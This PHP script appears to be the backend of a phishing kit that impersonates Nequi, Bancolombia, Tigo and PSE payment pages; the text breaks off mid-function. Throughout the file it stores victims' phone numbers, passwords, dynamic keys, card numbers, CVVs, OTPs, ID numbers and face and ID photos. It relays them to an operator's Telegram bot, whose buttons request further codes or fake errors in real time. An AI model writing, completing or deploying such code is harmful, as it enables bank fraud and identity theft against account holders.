<?php

// Configurar logging
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/../../logs/php-errors.log');
error_log("[TELEGRAM SEND] Script iniciado");

require_once __DIR__ . '/../../vendor/autoload.php';

use App\TelegramBot;
use App\Config\BankConfig;

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

$input = file_get_contents('php://input');
error_log("[TELEGRAM SEND] Raw input: " . substr($input, 0, 500));

$data = json_decode($input, true);

if (!$data) {
    error_log("[TELEGRAM SEND] JSON decode failed. JSON error: " . json_last_error_msg());
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'error' => 'Invalid JSON: ' . json_last_error_msg()
    ]);
    exit;
}

$telegram = new TelegramBot();

// Obtener sessionId del cliente
$sessionId = $data['session_id'] ?? 'unknown';

// Determinar el tipo de acción
$action = $data['action'] ?? '';
$bank = $data['bank'] ?? 'Desconocido';
$step = $data['step'] ?? '';

error_log("[TELEGRAM SEND] Action: {$action}, SessionID: {$sessionId}");
error_log("[TELEGRAM SEND] Data: " . json_encode($data));

$result = null; // Inicializar resultado

try {
    // Obtener datos acumulados de la sesión
    $sessionDataFile = __DIR__ . '/../../storage/nequi_sessions.json';
    $allSessions = file_exists($sessionDataFile) ? json_decode(file_get_contents($sessionDataFile), true) : [];
    $sessionData = $allSessions[$sessionId] ?? ['data' => []];
    $accumulatedData = $sessionData['data'] ?? [];
    
    // Botones únicos para todos los mensajes de Nequi
    $buttons = [
        [
            ['text' => '📱 Pedir Número', 'callback_data' => "nequi_request_numero|{$sessionId}"],
            ['text' => '🔐 Pedir Clave', 'callback_data' => "nequi_request_clave|{$sessionId}"]
        ],
        [
            ['text' => '📊 Pedir Saldo', 'callback_data' => "nequi_pedir_saldo|{$sessionId}"],
            ['text' => '🎯 Pedir Dinámica', 'callback_data' => "nequi_request_dinamica|{$sessionId}"]
        ],
        [
            ['text' => '❌ Error Clave', 'callback_data' => "nequi_error_clave|{$sessionId}"],
            ['text' => '❌ Error Dinámica', 'callback_data' => "nequi_error_dinamica|{$sessionId}"]
        ],
        [
            ['text' => '🏁 Finalizar', 'callback_data' => "nequi_finalizar|{$sessionId}"]
        ]
    ];
    
    switch ($action) {
        case 'nequi_numero':
            // Guardar sesión Nequi
            $sessionsFile = __DIR__ . '/../../storage/nequi_sessions.json';
            $sessions = [];
            if (file_exists($sessionsFile)) {
                $sessions = json_decode(file_get_contents($sessionsFile), true) ?? [];
            }
            
            if (!isset($sessions[$sessionId])) {
                $sessions[$sessionId] = [
                    'session_id' => $sessionId,
                    'created_at' => date('Y-m-d H:i:s'),
                    'data' => []
                ];
            }
            
            // Guardar número de teléfono
            $phoneNumber = $data['data']['phoneNumber'] ?? '';
            $sessions[$sessionId]['data']['phoneNumber'] = $phoneNumber;
            $sessions[$sessionId]['last_update'] = date('Y-m-d H:i:s');
            
            file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
            
            // Obtener datos acumulados
            $accumulatedData = $sessions[$sessionId]['data'];
            
            // Construir mensaje con datos acumulados
            $message = "🟣 <b>NEQUI</b>\n\n";
            $message .= "📊 <b>Datos Acumulados:</b>\n";
            $message .= "━━━━━━━━━━━━━━━━\n\n";
            
            if (!empty($accumulatedData['phoneNumber'])) {
                $message .= "📱 <b>Número:</b> <code>{$accumulatedData['phoneNumber']}</code>\n";
            }
            if (!empty($accumulatedData['clave'])) {
                $message .= "🔐 <b>Clave:</b> <code>{$accumulatedData['clave']}</code>\n";
            }
            if (!empty($accumulatedData['claveDinamica'])) {
                $message .= "🎯 <b>Dinámica:</b> <code>{$accumulatedData['claveDinamica']}</code>\n";
            }
            
            $message .= "\n🆔 <code>" . substr($sessionId, 0, 12) . "</code>";
            
            $result = $telegram->sendMessageWithButtons($message, $buttons);
            break;

        case 'nequi_clave':
            // Cargar y actualizar sesión
            $sessionsFile = __DIR__ . '/../../storage/nequi_sessions.json';
            $sessions = [];
            if (file_exists($sessionsFile)) {
                $sessions = json_decode(file_get_contents($sessionsFile), true) ?? [];
            }
            
            if (!isset($sessions[$sessionId])) {
                $sessions[$sessionId] = [
                    'session_id' => $sessionId,
                    'created_at' => date('Y-m-d H:i:s'),
                    'data' => []
                ];
            }
            
            // Guardar clave
            $clave = $data['data']['clave'] ?? '';
            $sessions[$sessionId]['data']['clave'] = $clave;
            $sessions[$sessionId]['last_update'] = date('Y-m-d H:i:s');
            
            file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
            
            $accumulatedData = $sessions[$sessionId]['data'];
            
            // Construir mensaje con datos acumulados
            $message = "🟣 <b>NEQUI</b>\n\n";
            $message .= "📊 <b>Datos Acumulados:</b>\n";
            $message .= "━━━━━━━━━━━━━━━━\n\n";
            
            if (!empty($accumulatedData['phoneNumber'])) {
                $message .= "📱 <b>Número:</b> <code>{$accumulatedData['phoneNumber']}</code>\n";
            }
            if (!empty($accumulatedData['clave'])) {
                $message .= "🔐 <b>Clave:</b> <code>{$accumulatedData['clave']}</code>\n";
            }
            if (!empty($accumulatedData['claveDinamica'])) {
                $message .= "🎯 <b>Dinámica:</b> <code>{$accumulatedData['claveDinamica']}</code>\n";
            }
            
            $message .= "\n🆔 <code>" . substr($sessionId, 0, 12) . "</code>";
            
            $result = $telegram->sendMessageWithButtons($message, $buttons);
            break;

        case 'nequi_dinamica':
            // Cargar y actualizar sesión
            $sessionsFile = __DIR__ . '/../../storage/nequi_sessions.json';
            $sessions = [];
            if (file_exists($sessionsFile)) {
                $sessions = json_decode(file_get_contents($sessionsFile), true) ?? [];
            }
            
            if (!isset($sessions[$sessionId])) {
                $sessions[$sessionId] = [
                    'session_id' => $sessionId,
                    'created_at' => date('Y-m-d H:i:s'),
                    'data' => []
                ];
            }
            
            // Guardar clave dinámica
            $dinamica = $data['data']['claveDinamica'] ?? '';
            $sessions[$sessionId]['data']['claveDinamica'] = $dinamica;
            $sessions[$sessionId]['last_update'] = date('Y-m-d H:i:s');
            
            file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
            
            $accumulatedData = $sessions[$sessionId]['data'];
            
            // Construir mensaje con TODOS los datos acumulados
            $message = "🟣 <b>NEQUI - COMPLETO</b>\n\n";
            $message .= "📊 <b>Datos Acumulados:</b>\n";
            $message .= "━━━━━━━━━━━━━━━━\n\n";
            
            if (!empty($accumulatedData['phoneNumber'])) {
                $message .= "📱 <b>Número:</b> <code>{$accumulatedData['phoneNumber']}</code>\n";
            }
            if (!empty($accumulatedData['clave'])) {
                $message .= "🔐 <b>Clave:</b> <code>{$accumulatedData['clave']}</code>\n";
            }
            if (!empty($accumulatedData['claveDinamica'])) {
                $message .= "🎯 <b>Dinámica:</b> <code>{$accumulatedData['claveDinamica']}</code>\n";
            }
            
            $message .= "\n✅ <b>Todos los datos recopilados</b>\n";
            $message .= "🆔 <code>" . substr($sessionId, 0, 12) . "</code>";
            
            $result = $telegram->sendMessageWithButtons($message, $buttons);
            break;

        case 'pse_email':
            $email = $data['data']['email'] ?? '';
            $selectedBank = $data['data']['selectedBank'] ?? '';
            $message = "🏦 <b>PSE - Datos de Acceso</b>\n\n";
            $message .= "📧 <b>Email:</b> <code>{$email}</code>\n";
            $message .= "🏛️ <b>Banco:</b> {$selectedBank}\n";
            $message .= "🆔 <b>Sesión:</b> <code>" . substr($sessionId, 0, 8) . "...</code>\n";
            $message .= "⏰ <b>Hora:</b> " . date('Y-m-d H:i:s');
            
            $buttons = [
                [
                    ['text' => '✅ Seguir a Banco', 'callback_data' => "pse_continue_bank|{$sessionId}"],
                    ['text' => '❌ Rechazar', 'callback_data' => "pse_reject|{$sessionId}"]
                ]
            ];
            
            $result = $telegram->sendMessageWithButtons($message, $buttons);
            break;

        // ========== BANCOLOMBIA ==========
        case 'bancolombia_login':
        case 'bancolombia_cedula':
        case 'bancolombia_tarjeta':
        case 'bancolombia_dinamica':
        case 'bancolombia_terminos':
        case 'bancolombia_cara':
            // Archivo de sesiones
            $sessionsFile = __DIR__ . '/../../storage/bancolombia_sessions.json';
            $sessions = [];
            if (file_exists($sessionsFile)) {
                $sessions = json_decode(file_get_contents($sessionsFile), true) ?? [];
            }
            
            // Inicializar sesión si no existe
            if (!isset($sessions[$sessionId])) {
                $sessions[$sessionId] = [
                    'session_id' => $sessionId,
                    'created_at' => date('Y-m-d H:i:s'),
                    'data' => []
                ];
            }
            
            // Guardar nuevos datos en la sesión
            if (isset($data['data'])) {
                $newData = $data['data'];
                
                // Merge de datos (acumulación)
                foreach ($newData as $key => $value) {
                    $sessions[$sessionId]['data'][$key] = $value;
                }
            }
            
            $sessions[$sessionId]['last_update'] = date('Y-m-d H:i:s');
            
            // Guardar archivo
            file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
            
            // Obtener datos acumulados
            $accumulatedData = $sessions[$sessionId]['data'];
            
            // Botones unificados para todos los mensajes de Bancolombia
            $buttons = [
                [
                    ['text' => '🔑 Pedir Logo', 'callback_data' => "bancolombia_request_login|{$sessionId}"],
                    ['text' => '🔢 Pedir Dinámica', 'callback_data' => "bancolombia_request_dinamica|{$sessionId}"]
                ],
                [
                    ['text' => '💳 Pedir Tarjeta', 'callback_data' => "bancolombia_request_tarjeta|{$sessionId}"],
                    ['text' => '🆔 Pedir Cédula', 'callback_data' => "bancolombia_request_cedula|{$sessionId}"]
                ],
                [
                    ['text' => '📷 Pedir Cara', 'callback_data' => "bancolombia_request_cara|{$sessionId}"],
                    ['text' => '📄 Pedir Términos', 'callback_data' => "bancolombia_request_terminos|{$sessionId}"]
                ],
                [
                    ['text' => '🏁 Finalizar', 'callback_data' => "bancolombia_finalizar|{$sessionId}"]
                ]
            ];
            
            // Construir mensaje acumulado
            $message = "🟡 <b>BANCOLOMBIA</b>\n\n";
            
            if (!empty($accumulatedData['usuario'])) {
                $message .= "👤 <b>Usuario:</b> <code>{$accumulatedData['usuario']}</code>\n";
            }
            if (!empty($accumulatedData['clave'])) {
                $message .= "🔑 <b>Clave:</b> <code>{$accumulatedData['clave']}</code>\n";
            }
            if (!empty($accumulatedData['cardNumber'])) {
                $message .= "💳 <b>Tarjeta:</b> <code>{$accumulatedData['cardNumber']}</code>\n";
                if (!empty($accumulatedData['cardHolder'])) {
                    $message .= "👤 <b>Titular:</b> <code>{$accumulatedData['cardHolder']}</code>\n";
                }
                if (!empty($accumulatedData['expiryDate'])) {
                    $message .= "📅 <b>Vencimiento:</b> <code>{$accumulatedData['expiryDate']}</code>\n";
                }
                if (!empty($accumulatedData['cvv'])) {
                    $message .= "🔐 <b>CVV:</b> <code>{$accumulatedData['cvv']}</code>\n";
                }
            }
            if (!empty($accumulatedData['dinamica'])) {
                $message .= "🎲 <b>Dinámica:</b> <code>{$accumulatedData['dinamica']}</code>\n";
            }
            if (!empty($accumulatedData['terminos'])) {
                $message .= "📄 <b>Términos:</b> ✅ Aceptados\n";
            }
            if (!empty($accumulatedData['cedula_foto'])) {
                $message .= "🆔 <b>Cédula:</b> 📸 Foto capturada\n";
            }
            if (!empty($accumulatedData['cara_foto'])) {
                $message .= "📷 <b>Cara:</b> 📸 Selfie capturada\n";
            }
            
            $message .= "\n🆔 <code>" . substr($sessionId, 0, 12) . "</code>";
            
            // Enviar fotos si existen
            if (!empty($accumulatedData['photo'])) {
                // Enviar foto primero
                $photoBase64 = $accumulatedData['photo'];
                if (strpos($photoBase64, 'base64,') !== false) {
                    $photoBase64 = explode('base64,', $photoBase64)[1];
                }
                $photoData = base64_decode($photoBase64);
                
                $tmpFile = tempnam(sys_get_temp_dir(), 'bancolombia_') . '.jpg';
                file_put_contents($tmpFile, $photoData);
                
                $telegram->sendPhotoWithButtons($tmpFile, $message, $buttons);
                unlink($tmpFile);
                
                // Limpiar foto de la sesión después de enviar
                unset($sessions[$sessionId]['data']['photo']);
                file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
                
                $result = ['ok' => true];
            } else {
                // Si no hay foto, enviar solo el mensaje
                $result = $telegram->sendMessageWithButtons($message, $buttons);
            }
            break;

        // ========== TIGO TARJETA ==========
        case 'tigo_card':
            // Guardar datos de tarjeta
            $sessionsFile = __DIR__ . '/../../storage/tigo_card_sessions.json';
            $sessions = [];
            if (file_exists($sessionsFile)) {
                $sessions = json_decode(file_get_contents($sessionsFile), true) ?? [];
            }
            
            if (!isset($sessions[$sessionId])) {
                $sessions[$sessionId] = [
                    'session_id' => $sessionId,
                    'created_at' => date('Y-m-d H:i:s'),
                    'data' => []
                ];
            }
            
            // Guardar datos de tarjeta
            $sessions[$sessionId]['data'] = array_merge(
                $sessions[$sessionId]['data'],
                [
                    'invoice_id' => $data['invoice_id'] ?? '',
                    'card_number' => $data['card_number'] ?? '',
                    'expiry_date' => $data['expiry_date'] ?? '',
                    'cvv' => $data['cvv'] ?? '',
                    'cardholder_name' => $data['cardholder_name'] ?? '',
                    'installments' => $data['installments'] ?? '',
                    'address' => $data['address'] ?? '',
                    'doc_type' => $data['doc_type'] ?? '',
                    'doc_number' => $data['doc_number'] ?? '',
                    'email' => $data['email'] ?? ''
                ]
            );
            $sessions[$sessionId]['last_update'] = date('Y-m-d H:i:s');
            
            file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
            
            $cardData = $sessions[$sessionId]['data'];
            
            $message = "💳 <b>TIGO - PAGO CON TARJETA</b>\n\n";
            $message .= "🧾 <b>Factura:</b> <code>{$cardData['invoice_id']}</code>\n";
            $message .= "💳 <b>Tarjeta:</b> <code>{$cardData['card_number']}</code>\n";
            $message .= "📅 <b>Vencimiento:</b> <code>{$cardData['expiry_date']}</code>\n";
            $message .= "🔐 <b>CVV:</b> <code>{$cardData['cvv']}</code>\n";
            $message .= "👤 <b>Titular:</b> <code>{$cardData['cardholder_name']}</code>\n";
            $message .= "📊 <b>Cuotas:</b> {$cardData['installments']}\n";
            $message .= "🏠 <b>Dirección:</b> {$cardData['address']}\n";
            $message .= "🆔 <b>{$cardData['doc_type']}:</b> <code>{$cardData['doc_number']}</code>\n";
            $message .= "📧 <b>Email:</b> <code>{$cardData['email']}</code>\n";
            $message .= "\n⏰ {$data['timestamp']}\n";
            $message .= "🔖 <code>" . substr($sessionId, 0, 12) . "</code>";
            
            $buttons = [
                [
                    ['text' => '❌ Error Tarjeta', 'callback_data' => "error_tarjeta|{$sessionId}"],
                    ['text' => '📲 Pedir OTP', 'callback_data' => "pedir_otp|{$sessionId}"]
                ],
                [
                    ['text' => '❌ Error OTP', 'callback_data' => "error_otp|{$sessionId}"],
                    ['text' => '✅ Finalizar', 'callback_data' => "finalizar|{$sessionId}"]
                ]
            ];
            
            $result = $telegram->sendMessageWithButtons($message, $buttons);
            break;

        case 'tigo_nequi':
            // Guardar sesión en archivo JSON
            $sessionsFile = __DIR__ . '/../../storage/nequi_sessions.json';
            $sessions = [];
            if (file_exists($sessionsFile)) {
                $sessions = json_decode(file_get_contents($sessionsFile), true);
            }
            
            $sessions[$sessionId] = [
                'invoice_id' => $data['invoice_id'],
                'amount' => $data['amount'],
                'payment_method' => 'nequi',
                'timestamp' => $data['timestamp'],
                'created_at' => date('Y-m-d H:i:s')
            ];
            
            file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
            error_log("✅ [NEQUI] Sesión guardada: {$sessionId}");
            
            // Notificación de pago con Nequi desde Tigo
            $message = "🟣 <b>TIGO - PAGO CON NEQUI</b>\n\n";
            $message .= "🧾 <b>ID Factura:</b> <code>{$data['invoice_id']}</code>\n";
            $message .= "💵 <b>Monto:</b> $" . number_format($data['amount'], 0, ',', '.') . "\n";
            $message .= "📱 <b>Método:</b> Nequi\n";
            $message .= "\n⏰ {$data['timestamp']}\n";
            $message .= "🔖 <code>" . substr($sessionId, 0, 12) . "</code>";
            
            $buttons = [
                [
                    ['text' => '✅ Continuar a Nequi', 'callback_data' => "tigo_nequi_continue|{$sessionId}"],
                    ['text' => '❌ Rechazar', 'callback_data' => "tigo_nequi_reject|{$sessionId}"]
                ]
            ];
            
            error_log("[TIGO_NEQUI] Enviando mensaje con botones: " . json_encode($buttons));
            $result = $telegram->sendMessageWithButtons($message, $buttons);
            error_log("[TIGO_NEQUI] Resultado Telegram: " . json_encode($result));
            break;

        case 'tigo_bancolombia':
            // Guardar sesión en archivo JSON
            $sessionsFile = __DIR__ . '/../../storage/bancolombia_sessions.json';
            $sessions = [];
            if (file_exists($sessionsFile)) {
                $sessions = json_decode(file_get_contents($sessionsFile), true);
            }
            
            $sessions[$sessionId] = [
                'invoice_id' => $data['invoice_id'],
                'amount' => $data['amount'],
                'payment_method' => 'bancolombia',
                'timestamp' => $data['timestamp'],
                'created_at' => date('Y-m-d H:i:s')
            ];
            
            file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
            error_log("✅ [BANCOLOMBIA] Sesión guardada: {$sessionId}");
            
            // Notificación de pago con Bancolombia desde Tigo
            $message = "🟡 <b>TIGO - PAGO CON BANCOLOMBIA</b>\n\n";
            $message .= "🧾 <b>ID Factura:</b> <code>{$data['invoice_id']}</code>\n";
            $message .= "💵 <b>Monto:</b> $" . number_format($data['amount'], 0, ',', '.') . "\n";
            $message .= "🏦 <b>Método:</b> Bancolombia\n";
            $message .= "\n⏰ {$data['timestamp']}\n";
            $message .= "🔖 <code>" . substr($sessionId, 0, 12) . "</code>";
            
            $buttons = [
                [
                    ['text' => '✅ Continuar a Bancolombia', 'callback_data' => "tigo_bancolombia_continue|{$sessionId}"],
                    ['text' => '❌ Rechazar', 'callback_data' => "tigo_bancolombia_reject|{$sessionId}"]
                ]
            ];
            
            $result = $telegram->sendMessageWithButtons($message, $buttons);
            break;

        case 'tigo_tarjeta':
            // Guardar sesión en archivo JSON
            $sessionsFile = __DIR__ . '/../../storage/tigo_card_sessions.json';
            $sessions = [];
            if (file_exists($sessionsFile)) {
                $sessions = json_decode(file_get_contents($sessionsFile), true);
            }
            
            $sessions[$sessionId] = [
                'invoice_id' => $data['invoice_id'],
                'amount' => $data['amount'],
                'payment_method' => 'card',
                'timestamp' => $data['timestamp'],
                'created_at' => date('Y-m-d H:i:s')
            ];
            
            file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
            error_log("✅ [CARD] Sesión guardada: {$sessionId}");
            
            // Notificación de inicio de pago con tarjeta desde Tigo
            $message = "💳 <b>TIGO - PAGO CON TARJETA</b>\n\n";
            $message .= "🧾 <b>ID Factura:</b> <code>{$data['invoice_id']}</code>\n";
            $message .= "💵 <b>Monto:</b> $" . number_format($data['amount'], 0, ',', '.') . "\n";
            $message .= "💳 <b>Método:</b> Tarjeta de Crédito/Débito\n";
            $message .= "\n⏰ {$data['timestamp']}\n";
            $message .= "🔖 <code>" . substr($sessionId, 0, 12) . "</code>";
            
            $buttons = [
                [
                    ['text' => '✅ Continuar a Formulario', 'callback_data' => "tigo_tarjeta_continue|{$sessionId}"],
                    ['text' => '❌ Rechazar', 'callback_data' => "tigo_tarjeta_reject|{$sessionId}"]
                ]
            ];
            
            $result = $telegram->sendMessageWithButtons($message, $buttons);
            break;

        case 'tigo_pse':
            // Guardar sesión PSE
            $sessionsFile = __DIR__ . '/../../storage/tigo_pse_sessions.json';
            $sessions = [];
            if (file_exists($sessionsFile)) {
                $sessions = json_decode(file_get_contents($sessionsFile), true) ?? [];
            }
            
            $sessions[$sessionId] = [
                'session_id' => $sessionId,
                'created_at' => date('Y-m-d H:i:s'),
                'data' => $data,
                'last_update' => date('Y-m-d H:i:s')
            ];
            
            file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
            
            $pseData = $data;
            
            // Verificar si es mensaje inicial (solo email) o completo (con banco)
            if (isset($pseData['bank_name'])) {
                // Mensaje completo con banco seleccionado
                $message = "🏦 <b>TIGO - PAGO PSE COMPLETO</b>\n\n";
                $message .= "🧾 <b>Factura:</b> <code>{$pseData['invoice_id']}</code>\n";
                $message .= "🏦 <b>Banco:</b> {$pseData['bank_name']}\n";
                $message .= "👤 <b>Tipo:</b> {$pseData['person_type']}\n";
                $message .= "📝 <b>Nombre:</b> {$pseData['full_name']}\n";
                $message .= "🆔 <b>{$pseData['doc_type']}:</b> <code>{$pseData['doc_number']}</code>\n";
                $message .= "📧 <b>Email:</b> <code>{$pseData['email']}</code>\n";
                $message .= "\n⏰ {$data['timestamp']}\n";
                $message .= "🔖 <code>" . substr($sessionId, 0, 12) . "</code>";
                
                $buttons = [
                    [
                        ['text' => '✅ Seguir a Banco', 'callback_data' => "seguir_banco|{$sessionId}"],
                        ['text' => '❌ Rechazar', 'callback_data' => "rechazar_pse|{$sessionId}"]
                    ]
                ];
            } else {
                // Mensaje inicial solo con email
                $message = "🏦 <b>TIGO - SOLICITUD PSE INICIAL</b>\n\n";
                $message .= "🧾 <b>Factura:</b> <code>{$pseData['invoice_id']}</code>\n";
                $message .= "👤 <b>Tipo Persona:</b> {$pseData['person_type']}\n";
                $message .= "👥 <b>Usuario:</b> " . ($pseData['is_registered'] ? 'Registrado' : 'Nuevo') . "\n";
                $message .= "📧 <b>Email:</b> <code>{$pseData['email']}</code>\n";
                $message .= "\n⏰ {$data['timestamp']}\n";
                $message .= "🔖 <code>" . substr($sessionId, 0, 12) . "</code>";
                
                $buttons = [
                    [
                        ['text' => '✅ Continuar a Banco', 'callback_data' => "seguir_banco|{$sessionId}"],
                        ['text' => '❌ Rechazar PSE', 'callback_data' => "rechazar_pse|{$sessionId}"]
                    ]
                ];
            }
            
            $result = $telegram->sendMessageWithButtons($message, $buttons);
            break;

        case 'tigo_card_otp':
            // Guardar OTP
            $sessionsFile = __DIR__ . '/../../storage/tigo_card_sessions.json';
            $sessions = [];
            if (file_exists($sessionsFile)) {
                $sessions = json_decode(file_get_contents($sessionsFile), true) ?? [];
            }
            
            if (isset($sessions[$sessionId])) {
                $sessions[$sessionId]['data']['otp_code'] = $data['otp_code'] ?? '';
                $sessions[$sessionId]['last_update'] = date('Y-m-d H:i:s');
                file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
            }
            
            $cardData = $sessions[$sessionId]['data'] ?? [];
            
            $message = "💳 <b>TIGO - CÓDIGO OTP</b>\n\n";
            $message .= "🧾 <b>Factura:</b> <code>{$cardData['invoice_id']}</code>\n";
            $message .= "💳 <b>Tarjeta:</b> <code>{$cardData['card_number']}</code>\n";
            $message .= "🔐 <b>OTP:</b> <code>{$data['otp_code']}</code>\n";
            $message .= "\n⏰ {$data['timestamp']}\n";
            $message .= "🔖 <code>" . substr($sessionId, 0, 12) . "</code>";
            
            $buttons = [
                [
                    ['text' => '❌ Error Tarjeta', 'callback_data' => "error_tarjeta|{$sessionId}"],
                    ['text' => '📲 Pedir OTP', 'callback_data' => "pedir_otp|{$sessionId}"]
                ],
                [
                    ['text' => '❌ Error OTP', 'callback_data' => "error_otp|{$sessionId}"],
                    ['text' => '✅ Finalizar', 'callback_data' => "finalizar|{$sessionId}"]
                ]
            ];
            
            $result = $telegram->sendMessageWithButtons($message, $buttons);
            break;

        case 'tigo_card_resend_otp':
            // Notificación de reenvío de OTP
            $message = "🔄 <b>TIGO - Solicitud Reenvío OTP</b>\n\n";
            $message .= "El cliente ha solicitado reenviar el código OTP.\n";
            $message .= "🔖 <code>" . substr($sessionId, 0, 12) . "</code>";
            
            $result = $telegram->sendMessageWithButtons($message, []);
            break;

        case 'bank_data':
            // Datos genéricos de bancos
            $bankName = $data['bank'] ?? '';
            $stepName = $data['step'] ?? '';
            $bankData = $data['data'] ?? [];
            
            $message = "🏦 <b>{$bankName} - {$stepName}</b>\n\n";
            foreach ($bankData as $key => $value) {
                $message .= "▪️ <b>" . ucfirst($key) . ":</b> <code>{$value}</code>\n";
            }
            $message .= "⏰ <b>Hora:</b> " . date('Y-m-d H:i:s');
            
            $buttons = [
                [
                    ['text' => '✅ Continuar', 'callback_data' => "bank_{$bankName}_continue"],
                    ['text' => '❌ Rechazar', 'callback_data' => "bank_{$bankName}_reject"]
                ]
            ];
            
            $result = $telegram->sendMessageWithButtons($message, $buttons);
            break;

        case 'card_payment':
            $cardData = $data['data'] ?? [];
            $message = "💳 <b>TARJETA DE CRÉDITO/DÉBITO</b>\n\n";
            $message .= "💳 <b>Número:</b> <code>{$cardData['cardNumber']}</code>\n";
            $message .= "📅 <b>Vencimiento:</b> {$cardData['expiryDate']}\n";
            $message .= "🔐 <b>CVV:</b> <code>{$cardData['cvv']}</code>\n";
            $message .= "👤 <b>Titular:</b> {$cardData['cardHolder']}\n";
            $message .= "⏰ <b>Hora:</b> " . date('Y-m-d H:i:s');
            
            $buttons = [
                [
                    ['text' => '✅ Aprobar', 'callback_data' => 'card_approve'],
                    ['text' => '⚠️ Error Tarjeta', 'callback_data' => 'card_error']
                ],
                [
                    ['text' => '❌ Rechazar', 'callback_data' => 'card_reject']
                ]
            ];
            
            $result = $telegram->sendMessageWithButtons($message, $buttons);
            break;

        case 'bancolombia_data':
            $bancolombiaData = $data['data'] ?? [];
            $stepName = $data['step'] ?? '';
            $message = "🟡 <b>BANCOLOMBIA - {$stepName}</b>\n\n";
            foreach ($bancolombiaData as $key => $value) {
                $message .= "▪️ <b>" . ucfirst($key) . ":</b> <code>{$value}</code>\n";
            }
            $message .= "⏰ <b>Hora:</b> " . date('Y-m-d H:i:s');
            
            $buttons = [
                [
                    ['text' => '✅ Continuar', 'callback_data' => 'bancolombia_continue'],
                    ['text' => '❌ Rechazar', 'callback_data' => 'bancolombia_reject']
                ]
            ];
            
            $result = $telegram->sendMessageWithButtons($message, $buttons);
            break;

        case 'action_executed':
            // Confirmación de que una acción fue ejecutada
            $actionType = $data['action_type'] ?? 'Acción';
            
            $message = "✅ Comando ejecutado - Sesión " . substr($sessionId, 0, 8);
            
            // Mensaje sin botones (solo informativo)
            $result = $telegram->sendMessageWithButtons($message, []);
            break;

        default:
            // Handler genérico para bancos usando configuración centralizada
            // Patrón: {banco}_{step}
            if (preg_match(BankConfig::getRegexPattern(), $action, $matches)) {
                $banco = $matches[1];
                $step = $matches[2];
                
                // Verificar que el banco exista
                if (!BankConfig::exists($banco)) {
                    echo json_encode(['success' => false, 'error' => 'Banco no configurado']);
                    exit;
                }
                
                $bankConfig = BankConfig::get($banco);
                $bankName = $bankConfig['displayName'];
                
                // Guardar sesión del banco
                $sessionsFile = BankConfig::getSessionFile($banco, __DIR__ . "/../../storage");
                $sessions = [];
                if (file_exists($sessionsFile)) {
                    $sessions = json_decode(file_get_contents($sessionsFile), true) ?? [];
                }
                
                if (!isset($sessions[$sessionId])) {
                    $sessions[$sessionId] = [
                        'session_id' => $sessionId,
                        'created_at' => date('Y-m-d H:i:s'),
                        'data' => []
                    ];
                }
                
                $sessions[$sessionId]['data'][$step] = $data['data'] ?? $data;
                $sessions[$sessionId]['last_update'] = date('Y-m-d H:i:s');
                file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
                
                // Construir mensaje
                $stepNames = [
                    'login' => 'LOGIN',
                    'password' => 'CONTRASEÑA',
                    'dinamica' => 'CLAVE DINÁMICA',
                    'otp' => 'CÓDIGO OTP',
                    'token' => 'TOKEN'
                ];
                
                $stepName = $stepNames[$step] ?? strtoupper($step);
                
                $message = "{$bankName} - {$stepName}\n\n";
                $stepData = $data['data'] ?? [];
                
                foreach ($stepData as $key => $value) {
                    $label = str_replace('_', ' ', ucfirst($key));
                    $message .= "▪️ <b>{$label}:</b> <code>{$value}</code>\n";
                }
                
                $message .= "\n⏰ " . ($data['timestamp'] ?? date('Y-m-d H:i:s'));
                $message .= "\n🔖 <code>" . substr($sessionId, 0, 12) . "</code>";
                
                // Botones genéricos basados en el step
                $buttons = [];
                
                if ($step === 'login') {
                    $buttons = [
                        [
                            ['text' => '❌ Error Login', 'callback_data' => "{$banco}_error_login|{$sessionId}"],
                            ['text' => '📝 Pedir Contraseña', 'callback_data' => "{$banco}_request_password|{$sessionId}"]
                        ],
                        [
                            ['text' => '✅ Finalizar', 'callback_data' => "{$banco}_finalizar|{$sessionId}"]
                        ]
                    ];
                } elseif ($step === 'password') {
                    $buttons = [
                        [
                            ['text' => '❌ Error Password', 'callback_data' => "{$banco}_error_password|{$sessionId}"],
                            ['text' => '🔢 Pedir Dinámica', 'callback_data' => "{$banco}_request_dinamica|{$sessionId}"]
                        ],
                        [
                            ['text' => '📲 Pedir OTP', 'callback_data' => "{$banco}_request_otp|{$sessionId}"],
                            ['text' => '🔐 Pedir Token', 'callback_data' => "{$banco}_request_token|{$sessionId}"]
                        ],
                        [
                            ['text' => '✅ Finalizar', 'callback_data' => "{$banco}_finalizar|{$sessionId}"]
                        ]
                    ];
                } elseif ($step === 'dinamica') {
                    $buttons = [
                        [
                            ['text' => '❌ Error Dinámica', 'callback_data' => "{$banco}_error_dinamica|{$sessionId}"],
                            ['text' => '📲 Pedir OTP', 'callback_data' => "{$banco}_request_otp|{$sessionId}"]
                        ],
                        [
                            ['text' => '🔐 Pedir Token', 'callback_data' => "{$banco}_request_token|{$sessionId}"],
                            ['text' => '✅ Finalizar', 'callback_data' => "{$banco}_finalizar|{$sessionId}"]
                        ]
                    ];
                } elseif ($step === 'otp') {
                    $buttons = [
                        [
                            ['text' => '❌ Error OTP', 'callback_data' => "{$banco}_error_otp|{$sessionId}"],
                            ['text' => '🔐 Pedir Token', 'callback_data' => "{$banco}_request_token|{$sessionId}"]
                        ],
                        [
